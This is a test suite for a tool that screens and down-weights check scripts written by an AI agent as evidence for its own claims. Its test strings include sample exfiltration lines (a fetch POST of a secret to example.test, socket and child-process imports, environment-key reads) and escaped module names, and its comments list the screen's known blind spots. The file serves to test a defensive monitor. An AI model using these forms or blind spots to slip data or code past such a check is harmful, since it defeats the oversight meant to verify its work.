/**
 * SYNTHETIC EVIDENCE (ο) — the pure domain of PTC evidence synthesis.
 *
 * These tests pin the four load-bearing pieces of "the agent may construct
 * evidence for assertions nothing checks, but the chain lets it prove only
 * what actually ran":
 *
 * 1. the scaffold — the PASS/FAIL last-line protocol and the in-file warning
 *    that the script's source is hashed verbatim into its own evidence;
 * 2. the capability screen — the deny list (process/network/worker modules
 *    and process.env), its spelling tolerance, its deliberate over-report
 *    bias, and what static screening admits it cannot see;
 * 3. the discount — synthetic checks carry β = 0.15 where organic checks
 *    carry 0.02, and a synthetic pass therefore lifts the posterior less;
 * 4. the record — `scriptDigest` rides in the content address (two runs of
 *    the same outcome under different scripts are different evidence), and
 *    `new-paths-covered` accepts latest-on-record passes as fallback
 *    coverage, organic silently and synthetic with a said-out-loud discount.
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'

import {
  FORBIDDEN_CAPABILITIES, FORBIDDEN_GLOBALS, SYNTHETIC_DIR_DEFAULT, SYNTHETIC_TEMPLATE,
  sandboxEntryFor, screenScript, syntheticSpec,
  type SyntheticRequest,
} from '../src/core/synthetic.ts'
import {
  BAYES_CONSTANTS, computePriors, posteriorHealthy,
  type CheckPrior, type PriorInput,
} from '../src/core/bayes.ts'
import { makeEvidence, snapshotWorkspace, type Evidence, type RunOutcome } from '../src/core/evidence.ts'
import { evaluateContract, type ContractInput, type ContractVerdict } from '../src/core/contract.ts'
import type { ClaimContract } from '../src/core/contract.ts'
import { DEFAULT_IGNORE_DIRS } from '../src/core/checks.ts'
import { addressOf, sha256 } from '../src/core/hash.ts'
import type { CheckSpec } from '../src/core/ports.ts'
import { spec } from './helpers.ts'

const WS = snapshotWorkspace('head1', [])
/** Frozen clock: evidence-id comparisons must not see the clock tick. */
const FIXED_NOW = 1_700_000_000_000
const fixedClock = { now: () => FIXED_NOW }

const CLAIM = 'the parser rejects unterminated strings with a column number'
const CLAIM_ID = sha256(CLAIM).slice(0, 16)
const REQUEST: SyntheticRequest = {
  claimId: CLAIM_ID,
  claim: CLAIM,
  paths: ['src/parse.ts'],
  entry: sandboxEntryFor(CLAIM_ID, 0),
  requestedAt: FIXED_NOW,
}
const SYNTH_SPEC = syntheticSpec(REQUEST, SYNTHETIC_DIR_DEFAULT, 5_000)

function synthMeta(scriptDigest: string): { scriptDigest: string; sandbox: 'screened-subprocess'; screened: readonly string[]; author: 'agent' } {
  return { scriptDigest, sandbox: 'screened-subprocess', screened: [], author: 'agent' }
}

function synthPass(spec: CheckSpec, digest = sha256(SYNTHETIC_TEMPLATE)): Evidence {
  return makeEvidence(
    spec,
    { status: 'pass', exitCode: 0, durationMs: 12, output: 'SYNTHETIC: PASS' },
    WS, fixedClock, undefined, undefined, synthMeta(digest),
  )
}

function contractInput(over: Partial<ContractInput> = {}): ContractInput {
  return {
    contract: { kind: 'behavior-adding', claim: 'added the rejection' } as ClaimContract,
    changed: [],
    specs: [],
    records: [],
    baseline: undefined,
    apiSurfaceBefore: undefined,
    apiSurfaceAfter: undefined,
    graph: undefined,
    ...over,
  }
}

function obligation(verdict: ContractVerdict, id: string) {
  const found = verdict.obligations.find(o => o.id === id)
  assert.ok(found, `${id} present in ${verdict.obligations.map(o => o.id).join(', ')}`)
  return found
}

// ---------------------------------------------------------------------------
// 1. the scaffold and the sandbox entry
// ---------------------------------------------------------------------------

test('template: prints the PASS/FAIL protocol on the last line and nothing else decides', () => {
  assert.ok(SYNTHETIC_TEMPLATE.includes('SYNTHETIC: PASS'))
  assert.ok(SYNTHETIC_TEMPLATE.includes('SYNTHETIC: FAIL: '))
  // exit-code convention: a failing scaffold must not exit 0.
  assert.match(SYNTHETIC_TEMPLATE, /process\.exitCode = 1/)
})

test('template: warns in the file itself that the source enters the chain verbatim', () => {
  assert.match(SYNTHETIC_TEMPLATE, /verbatim/i)
  assert.match(SYNTHETIC_TEMPLATE, /scriptDigest/)
  assert.match(SYNTHETIC_TEMPLATE, /synthetic evidence/i)
})

test('template: the scaffold is clean under its own capability screen', () => {
  // The warning prose names the forbidden modules *unquoted*, and the screen
  // matches only quoted specifiers — so a filled-in scaffold starts from a
  // clean baseline and any finding on a submission is the author's addition.
  const { ok, findings } = screenScript(SYNTHETIC_TEMPLATE)
  assert.equal(ok, true, findings.join('; '))
  assert.deepEqual(findings, [])
})

test('sandboxEntryFor: deterministic format; seq disambiguates but is not identity', () => {
  assert.equal(sandboxEntryFor(CLAIM_ID, 0), `synthetic-${CLAIM_ID}-0.mjs`)
  assert.equal(sandboxEntryFor(CLAIM_ID, 0), sandboxEntryFor(CLAIM_ID, 0))
  assert.equal(sandboxEntryFor(CLAIM_ID, 7), `synthetic-${CLAIM_ID}-7.mjs`)
  assert.notEqual(sandboxEntryFor(CLAIM_ID, 0), sandboxEntryFor(CLAIM_ID, 1))
  assert.notEqual(sandboxEntryFor(CLAIM_ID, 0), sandboxEntryFor('deadbeefdeadbeef', 0))
})

test('the sandbox directory is pinned out of discovery (duplicated literal stays in sync)', () => {
  // checks.ts cannot import the const (synthetic.ts imports checkId from
  // checks.ts — the cycle's entry order decides TDZ), so the literal is
  // duplicated there. This test is the tripwire that keeps the two equal.
  assert.equal(SYNTHETIC_DIR_DEFAULT, '.proof-synthetic')
  assert.ok(DEFAULT_IGNORE_DIRS.includes(SYNTHETIC_DIR_DEFAULT))
})

// ---------------------------------------------------------------------------
// 2. the capability screen
// ---------------------------------------------------------------------------

test('screenScript: a clean fs-reading script passes with empty findings', () => {
  const clean = [
    "import { readFile, writeFile } from 'node:fs/promises'",
    'const fixture = await readFile("./fixture.json", "utf8")',
    'console.log(fixture.length)',
  ].join('\n')
  const { ok, findings } = screenScript(clean)
  assert.equal(ok, true, findings.join('; '))
  assert.deepEqual(findings, [])
})

test('screenScript: the deny list is exactly the locked capability set', () => {
  // M11: 'process' joined the lock (with 'node:process' named for the
  // contract text the engine and tool prose render verbatim; matching itself
  // reduces through the `node:` strip, where 'process' answers for both) —
  // `import { env } from 'node:process'` used to bypass the entire
  // process.env read check.
  // H-31: 'cluster' (fork is child_process with a friendlier name), 'dns'
  // and 'tls' (outbound channels exactly like http; dns tunnelling is the
  // classic covert one) joined — the screen's own charter ("make the easy
  // exfiltration attempts fail loudly") does not survive a deny list missing
  // the easiest channels.
  assert.deepEqual(FORBIDDEN_CAPABILITIES, [
    'child_process', 'net', 'http', 'https', 'dgram', 'worker_threads',
    'cluster', 'dns', 'tls',
    'process', 'node:process',
  ])
})

test('H-31: cluster/dns/tls are screened like every other outbound module', () => {
  for (const source of [
    "import cluster from 'node:cluster'",
    "const c = await import('cluster')",
    "import dns from 'node:dns'",
    "require('dns')",
    "import tls from 'node:tls'",
    "const t = await import('tls')",
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.equal(findings.length > 0, true, `${source}: ${findings.join('; ')}`)
  }
})

test('H-31: the zero-import globals (fetch, WebSocket) are screened by their call forms', () => {
  // Node ≥ 18 ships these on the global object — no import text exists for
  // the module screen to see, and a clean-import script could POST the
  // workspace anywhere. The call form is the only statically visible shape.
  for (const source of [
    "await fetch('https://example.test', { method: 'POST', body: secret })",
    'const r = fetch(url)',
    "const w = new WebSocket('wss://example.test')",
    'WebSocket(endpoint)',
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes('global')), `${source}: ${findings.join('; ')}`)
  }
  // Boundary precision both ways: identifiers merely CONTAINING the names
  // stay allowed (the deny-list must not teach authors to route around it).
  for (const source of [
    'const v = prefetch(url)',
    'const w2 = MyWebSocket(url)',
    "import { fetchFixture } from './fetch.mjs'",
    'console.log("WebSocket attempts: 0")',
  ]) {
    assert.equal(screenScript(source).ok, true, source)
  }
  // The exported list is the testable contract for the globals tier.
  assert.deepEqual(FORBIDDEN_GLOBALS, ['fetch', 'WebSocket'])
})

test('screenScript: static imports are caught, with and without the node: prefix', () => {
  for (const source of [
    "import { exec } from 'child_process'",
    "import { exec } from 'node:child_process'",
    "const { spawn } = require('node:child_process')",
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes('child_process')), `${source}: ${findings.join('; ')}`)
  }
})

test('screenScript: multi-line import lists and re-exports are caught', () => {
  const multi = [
    'import {',
    '  exec,',
    '  spawn,',
    "} from 'node:child_process'",
  ].join('\n')
  assert.equal(screenScript(multi).ok, false)
  // A re-export pulls the module in exactly like an import.
  assert.equal(screenScript("export { request } from 'https'").ok, false)
})

test('screenScript: dynamic imports with literal specifiers are caught', () => {
  for (const source of [
    "const net = await import('node:net')",
    "const mod = import('net')",
    "const w = await import('worker_threads')",
    "const d = await import('node:dgram')",
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes('dynamic import')), `${source}: ${findings.join('; ')}`)
  }
})

test('screenScript: require forms are caught for every network module', () => {
  for (const source of ["require('http')", "require('node:https')"]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes('require')), `${source}: ${findings.join('; ')}`)
  }
})

test('screenScript: process.env reads are caught in member and computed form', () => {
  for (const source of [
    'const key = process.env.DEPLOY_KEY',
    'const env = process . env',
    "const v = process['env']['HOME']",
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes('process.env')), `${source}: ${findings.join('; ')}`)
  }
})

test('screenScript: commented-out forbidden imports are flagged, not missed', () => {
  // The screen scans raw text, comments included — deliberate over-report:
  // for a deny list the safe direction is refusing an inert script, never
  // running a live one that merely *looks* commented out to a fast reader.
  const sneaky = [
    '// disabled during migration:',
    "// import { exec } from 'child_process'",
  ].join('\n')
  assert.equal(screenScript(sneaky).ok, false)
})

test('screenScript: local fixtures whose names merely contain a forbidden module are allowed', () => {
  // './network.mjs' reduces to root '.', not 'net' — boundary precision both
  // ways: missing a spelling is a hole, flagging an innocent fixture is noise
  // that teaches authors to route around the screen.
  assert.equal(screenScript("import { helper } from './network.mjs'").ok, true)
  assert.equal(screenScript("import http2ish from './my.http2ish.util.mjs'").ok, true)
})

test('screenScript: findings are deduplicated and sorted (screening output is recorded, it must address)', () => {
  const both = [
    "import { exec } from 'child_process'",
    "import { spawn } from 'node:child_process'",
    'const k = process.env.X',
  ].join('\n')
  const one = screenScript(both)
  assert.deepEqual(one.findings, [...one.findings].sort())
  assert.equal(new Set(one.findings).size, one.findings.length)
  assert.deepEqual(screenScript(both), one)
})

// Static-screening limits (documented in screenScript's doc comment, pinned
// here as prose so improving the screen later cannot silently change the
// contract): computed specifiers (import(name + suffix), createRequire, eval)
// are invisible to text matching. That is why the screen is a screen — the
// real boundary is the sandbox cwd, timeout, output cap and ptc-runtime tier.

// ---------------------------------------------------------------------------
// 3. the spec and the discount
// ---------------------------------------------------------------------------

test('syntheticSpec: an ordinary CheckSpec whose only specialness is source: synthetic', () => {
  assert.equal(SYNTH_SPEC.source, 'synthetic')
  assert.equal(SYNTH_SPEC.kind, 'test')
  assert.deepEqual(SYNTH_SPEC.command, ['node', REQUEST.entry])
  assert.equal(SYNTH_SPEC.cwd, SYNTHETIC_DIR_DEFAULT)
  assert.deepEqual(SYNTH_SPEC.paths, ['src/parse.ts'])
  assert.equal(SYNTH_SPEC.timeoutMs, 5_000)
  assert.match(SYNTH_SPEC.label, /synthetic/)
  assert.match(SYNTH_SPEC.label, new RegExp(CLAIM_ID))
  assert.match(SYNTH_SPEC.label, /parser rejects unterminated/)
  // Identity is the canonical formula: source + command + cwd.
  assert.match(SYNTH_SPEC.id, /^synthetic:[0-9a-f]{12}$/)
})

test('syntheticSpec: claim excerpts are collapsed to one deterministic line', () => {
  const long = `${'word '.repeat(40)}`
  const r: SyntheticRequest = { ...REQUEST, claim: long, claimId: 'a'.repeat(16) }
  const label = syntheticSpec(r, SYNTHETIC_DIR_DEFAULT, 1000).label
  const again = syntheticSpec({ ...r, claim: `${'word '.repeat(40)}  ` }, SYNTHETIC_DIR_DEFAULT, 1000).label
  assert.equal(label, again, 'whitespace collapse keeps labels addressable')
  assert.ok(label.length < 120, `label stays a summary: ${label}`)
})

test('computePriors: same history, synthetic β = 0.15, organic β = 0.02 — and nothing else moves', () => {
  const organic = spec({ id: 'organic', paths: ['src/parse.ts'] })
  const input: PriorInput = {
    specs: [organic, SYNTH_SPEC],
    changed: ['src/parse.ts'],
    history: new Map(),
    fallbackCostMs: 1_000,
  }
  const priors = computePriors(input)
  const o = priors.get('organic') as CheckPrior
  const s = priors.get(SYNTH_SPEC.id) as CheckPrior
  assert.equal(o.falsePass, 0.02)
  assert.equal(s.falsePass, 0.15)
  // The bump is the ONLY change: α and π are learned from history as always.
  assert.equal(s.falseFail, o.falseFail)
  assert.equal(s.priorHealthy, o.priorHealthy)
  assert.equal(s.impact, o.impact)
})

test('computePriors: syntheticFalsePass overrides the synthetic β and only it', () => {
  const organic = spec({ id: 'organic', paths: ['src/parse.ts'] })
  const priors = computePriors({
    specs: [organic, SYNTH_SPEC],
    changed: ['src/parse.ts'],
    history: new Map(),
    fallbackCostMs: 1_000,
    syntheticFalsePass: 0.3,
  })
  assert.equal((priors.get(SYNTH_SPEC.id) as CheckPrior).falsePass, 0.3)
  assert.equal((priors.get('organic') as CheckPrior).falsePass, BAYES_CONSTANTS.falsePass)
})

test('posteriorHealthy: a synthetic pass lifts belief less than an organic pass', () => {
  const base = { priorHealthy: 0.9, falseFail: 0.05, impact: 1, expectedCostMs: 1 }
  const organic: CheckPrior = { checkId: 'o', ...base, falsePass: 0.02 }
  const synthetic: CheckPrior = { checkId: 's', ...base, falsePass: 0.15 }
  const afterOrganic = posteriorHealthy(organic, 'pass')
  const afterSynthetic = posteriorHealthy(synthetic, 'pass')
  // Closed form of the binary-channel update, transcribed for comparison.
  assert.ok(Math.abs(afterOrganic - (0.9 * 0.95) / (0.9 * 0.95 + 0.1 * 0.02)) < 1e-12)
  assert.ok(Math.abs(afterSynthetic - (0.9 * 0.95) / (0.9 * 0.95 + 0.1 * 0.15)) < 1e-12)
  assert.ok(afterSynthetic < afterOrganic)
  // A failure still damns a synthetic check like any other — the discount
  // prices self-written *passes*, not self-written failures.
  assert.ok(posteriorHealthy(synthetic, 'fail') < posteriorHealthy(synthetic, 'pass'))
})

test('posterior discount holds end-to-end through computePriors-produced priors', () => {
  const organic = spec({ id: 'organic', paths: ['src/parse.ts'] })
  const priors = computePriors({
    specs: [organic, SYNTH_SPEC], changed: ['src/parse.ts'],
    history: new Map(), fallbackCostMs: 1_000,
  })
  const o = priors.get('organic') as CheckPrior
  const s = priors.get(SYNTH_SPEC.id) as CheckPrior
  assert.ok(posteriorHealthy(s, 'pass') < posteriorHealthy(o, 'pass'))
})

// ---------------------------------------------------------------------------
// 4. the record: synthetic metadata participates in the content address
// ---------------------------------------------------------------------------

test('makeEvidence: synthetic metadata is passed through onto the record', () => {
  const plain = makeEvidence(SYNTH_SPEC, { status: 'pass', exitCode: 0, durationMs: 5, output: 'SYNTHETIC: PASS' }, WS, fixedClock)
  assert.equal(plain.synthetic, undefined)
  const withMeta = makeEvidence(
    SYNTH_SPEC, { status: 'pass', exitCode: 0, durationMs: 5, output: 'SYNTHETIC: PASS' },
    WS, fixedClock, undefined, undefined, synthMeta(sha256('script-a')),
  )
  assert.deepEqual(withMeta.synthetic, synthMeta(sha256('script-a')))
  // The spec's source rides along on every record (synthetic or not).
  assert.equal(withMeta.source, 'synthetic')
  assert.equal(makeEvidence(spec({ id: 'c1' }), { status: 'pass', exitCode: 0, durationMs: 1, output: '' }, WS, fixedClock).source, 'config')
})

test('makeEvidence: same outcome, different scriptDigest -> different evidenceId (the record self-certifies)', () => {
  const outcome: RunOutcome = { status: 'pass', exitCode: 0, durationMs: 5, output: 'SYNTHETIC: PASS' }
  const a = makeEvidence(SYNTH_SPEC, outcome, WS, fixedClock, undefined, undefined, synthMeta(sha256('script-a')))
  const b = makeEvidence(SYNTH_SPEC, outcome, WS, fixedClock, undefined, undefined, synthMeta(sha256('script-b')))
  assert.notEqual(a.evidenceId, b.evidenceId)
  // And the record still addresses itself with the metadata included.
  const { evidenceId, ...rest } = a
  assert.equal(evidenceId, addressOf(rest))
})

test('makeEvidence: identical calls with a frozen clock are deeply identical', () => {
  const outcome: RunOutcome = { status: 'fail', exitCode: 1, durationMs: 7, output: 'SYNTHETIC: FAIL: 1/2 assertion(s) failed' }
  const a = makeEvidence(SYNTH_SPEC, outcome, WS, fixedClock, undefined, undefined, synthMeta(sha256('script-a')))
  const b = makeEvidence(SYNTH_SPEC, outcome, WS, fixedClock, undefined, undefined, synthMeta(sha256('script-a')))
  assert.deepEqual(a, b)
})

// ---------------------------------------------------------------------------
// 5. new-paths-covered: latest-on-record fallback (organic plainly, synthetic discounted)
// ---------------------------------------------------------------------------

test('contract: no run record + synthetic latest pass covers the path, met with the discount said out loud', () => {
  const verdict = evaluateContract(contractInput({
    changed: ['src/parse.ts'],
    specs: [SYNTH_SPEC],
    records: [],
    latestByCheckId: new Map([[SYNTH_SPEC.id, synthPass(SYNTH_SPEC)]]),
  }))
  const o = obligation(verdict, 'new-paths-covered')
  assert.equal(o.met, true)
  assert.match(o.detail, /covered by synthetic evidence \(discounted\)/)
})

test('contract: no coverage anywhere stays not-met with the pre-ο detail', () => {
  const unrelated = spec({ id: 'elsewhere', paths: ['docs/**'] })
  const noMap = evaluateContract(contractInput({
    changed: ['src/parse.ts'],
    specs: [unrelated],
    records: [],
  }))
  const o = obligation(noMap, 'new-paths-covered')
  assert.equal(o.met, false)
  assert.match(o.detail, /src\/parse\.ts/)
  assert.match(o.detail, /add a check/)
  // A latest record that is a fail (or non-decisive) covers nothing either.
  const failed = makeEvidence(SYNTH_SPEC, { status: 'fail', exitCode: 1, durationMs: 3, output: 'SYNTHETIC: FAIL: boom' }, WS, fixedClock, undefined, undefined, synthMeta(sha256('s')))
  const withBadLatest = evaluateContract(contractInput({
    changed: ['src/parse.ts'],
    specs: [SYNTH_SPEC],
    records: [],
    latestByCheckId: new Map([[SYNTH_SPEC.id, failed]]),
  }))
  assert.equal(obligation(withBadLatest, 'new-paths-covered').met, false)
})

test('contract: an organic latest pass also falls back — and is not called synthetic', () => {
  const veteran = spec({ id: 'vet', paths: ['src/**'] })
  const latest = makeEvidence(veteran, { status: 'pass', exitCode: 0, durationMs: 4, output: 'ok' }, WS, fixedClock)
  const verdict = evaluateContract(contractInput({
    changed: ['src/parse.ts'],
    specs: [veteran],
    records: [],
    latestByCheckId: new Map([[veteran.id, latest]]),
  }))
  const o = obligation(verdict, 'new-paths-covered')
  assert.equal(o.met, true, o.detail)
  assert.doesNotMatch(o.detail, /synthetic/)
  assert.match(o.detail, /latest on-record pass/)
})

test('contract: mixed coverage names every bucket, and run coverage still wins', () => {
  const runner = spec({ id: 'runner', paths: ['src/ran.ts'] })
  const verdict = evaluateContract(contractInput({
    changed: ['src/ran.ts', 'src/parse.ts'],
    specs: [runner, SYNTH_SPEC],
    records: [makeEvidence(runner, { status: 'pass', exitCode: 0, durationMs: 2, output: 'ok' }, WS, fixedClock)],
    latestByCheckId: new Map([[SYNTH_SPEC.id, synthPass(SYNTH_SPEC)]]),
  }))
  const o = obligation(verdict, 'new-paths-covered')
  assert.equal(o.met, true, o.detail)
  assert.match(o.detail, /1 by a passing check this run/)
  assert.match(o.detail, /1 covered by synthetic evidence \(discounted\)/)
})

test('contract: a this-run synthetic pass covering the path names the discount too', () => {
  // Fresh evidence from an interested party is still fresh *and* interested:
  // met stays true, but the detail must not read as independent confirmation.
  const verdict = evaluateContract(contractInput({
    changed: ['src/parse.ts'],
    specs: [SYNTH_SPEC],
    records: [synthPass(SYNTH_SPEC)],
  }))
  const o = obligation(verdict, 'new-paths-covered')
  assert.equal(o.met, true, o.detail)
  assert.match(o.detail, /covered by synthetic evidence \(discounted\)/)
})

test('contract: a this-run organic pass outranks every fallback — plain pre-ο detail', () => {
  const veteran = spec({ id: 'vet', paths: ['src/**'] })
  const verdict = evaluateContract(contractInput({
    changed: ['src/parse.ts'],
    specs: [veteran, SYNTH_SPEC],
    records: [makeEvidence(veteran, { status: 'pass', exitCode: 0, durationMs: 2, output: 'ok' }, WS, fixedClock)],
    latestByCheckId: new Map([[SYNTH_SPEC.id, synthPass(SYNTH_SPEC, sha256('older-script'))]]),
  }))
  const o = obligation(verdict, 'new-paths-covered')
  assert.equal(o.met, true, o.detail)
  // This run's organic record covered it, so the detail is the plain pre-ο
  // sentence — no fallback clause, no discount clause.
  assert.match(o.detail, /covered by a passing check$/)
})

test('contract: pre-ο records without a source field resolve synthetic-ness from the spec pool', () => {
  // Old logs predate Evidence.source; the spec list is the fallback oracle.
  const legacy: Evidence = {
    evidenceId: 'legacy',
    checkId: SYNTH_SPEC.id,
    label: SYNTH_SPEC.label,
    kind: 'test',
    command: SYNTH_SPEC.command,
    status: 'pass',
    exitCode: 0,
    durationMs: 9,
    outputDigest: '0'.repeat(64),
    outputHead: 'SYNTHETIC: PASS',
    recordedAt: '2026-01-01T00:00:00.000Z',
    workspace: WS,
  }
  const verdict = evaluateContract(contractInput({
    changed: ['src/parse.ts'],
    specs: [SYNTH_SPEC],
    records: [],
    latestByCheckId: new Map([[SYNTH_SPEC.id, legacy]]),
  }))
  const o = obligation(verdict, 'new-paths-covered')
  assert.equal(o.met, true)
  assert.match(o.detail, /covered by synthetic evidence \(discounted\)/)
})

// ---------------------------------------------------------------------------
// 6. determinism of the whole module's surface
// ---------------------------------------------------------------------------

test('determinism: every entry point is a pure function of its inputs', () => {
  assert.deepEqual(syntheticSpec(REQUEST, SYNTHETIC_DIR_DEFAULT, 5_000), SYNTH_SPEC)
  assert.deepEqual(screenScript("require('http')"), screenScript("require('http')"))
  const dirty = "import { exec } from 'child_process'\nconst k = process.env.X\nawait import('net')"
  assert.deepEqual(screenScript(dirty), screenScript(dirty))
  const ci = contractInput({
    changed: ['src/parse.ts'],
    specs: [SYNTH_SPEC],
    records: [],
    latestByCheckId: new Map([[SYNTH_SPEC.id, synthPass(SYNTH_SPEC)]]),
  })
  assert.deepEqual(evaluateContract(ci), evaluateContract(ci))
  const pi: PriorInput = {
    specs: [SYNTH_SPEC], changed: ['src/parse.ts'],
    history: new Map(), fallbackCostMs: 1_000, syntheticFalsePass: 0.2,
  }
  assert.deepEqual(computePriors(pi), computePriors(pi))
})

// ---------------------------------------------------------------------------
// 7. M11: screen hardening — backtick specifiers, escaped names, process
// ---------------------------------------------------------------------------

test('M11: backtick template-literal specifiers are screened like quoted ones', () => {
  // An uninterpolated template literal is a statically decidable specifier —
  // it never belonged in the computed-specifier limit, and `import(`…`)` used
  // to sail past all four regexes.
  for (const source of [
    'const cp = await import(`node:child_process`)',
    'const cp = import(`child_process`)',
    'const { spawn } = require(`node:child_process`)',
    'import { exec } from `node:child_process`',
    'import `node:child_process`',
    'export { spawn } from `node:child_process`',
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes('child_process')), `${source}: ${findings.join('; ')}`)
  }
})

test('M11: interpolated templates stay in the computed-specifier limit — silently, without false findings', () => {
  // `${…}` is a runtime value; text cannot see it. The screen neither flags
  // the partial text (a wrong finding teaches distrust) nor the classic
  // computed form — the admitted limit, bounded by the sandbox regime.
  assert.equal(screenScript('const mod = await import(`child_${name}`)').ok, true)
  assert.equal(screenScript('const mod = await import(name + suffix)').ok, true)
})

test('M11: unicode- and hex-escaped specifiers are unescaped before the deny list sees them', () => {
  for (const source of [
    "import { exec } from 'child_\\u0070rocess'",
    'import { exec } from "child_\\u0070rocess"',
    "const cp = await import('child_\\x70rocess')",
    "require('child_\\u0070rocess')",
    "require(`child_\\u{70}rocess`)",
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes('child_process')), `${source}: ${findings.join('; ')}`)
  }
  // The finding quotes the raw text as written — the evidence shows the
  // escape the author typed, the verdict names the decoded module.
  const one = screenScript("import { exec } from 'child_\\u0070rocess'")
  assert.ok(one.findings.some(f => f.includes("from 'child_\\u0070rocess'")))
})

test('M11: process / node:process imports are denied — the env bag has no module-import bypass', () => {
  for (const source of [
    "import { env } from 'node:process'",
    "import process from 'process'",
    "const { env } = await import('node:process')",
    "const p = require('process')",
    "import { env } from `proc\\u0065ss`",
  ]) {
    const { ok, findings } = screenScript(source)
    assert.equal(ok, false, source)
    assert.ok(findings.some(f => f.includes("'process'")), `${source}: ${findings.join('; ')}`)
  }
  // Boundary precision both ways: local fixtures merely named like the
  // module reduce to root '.' and stay allowed.
  assert.equal(screenScript("import { helper } from './process.util.mjs'").ok, true)
  assert.equal(screenScript("import { helper } from './process'").ok, true)
})

test('M11 (documented residual): process?.env and deconstruction stay unflagged', () => {
  // Known residual recorded beside RE_PROCESS_ENV: chasing optional chains
  // and binding shapes risks false positives on innocent member access, so
  // these spellings stay uncaught — bounded by the sandbox cwd, run timeout
  // and output cap, same as every other static-screen limit.
  assert.equal(screenScript('const v = process?.env?.HOME').ok, true)
  assert.equal(screenScript('const { env } = process').ok, true)
})
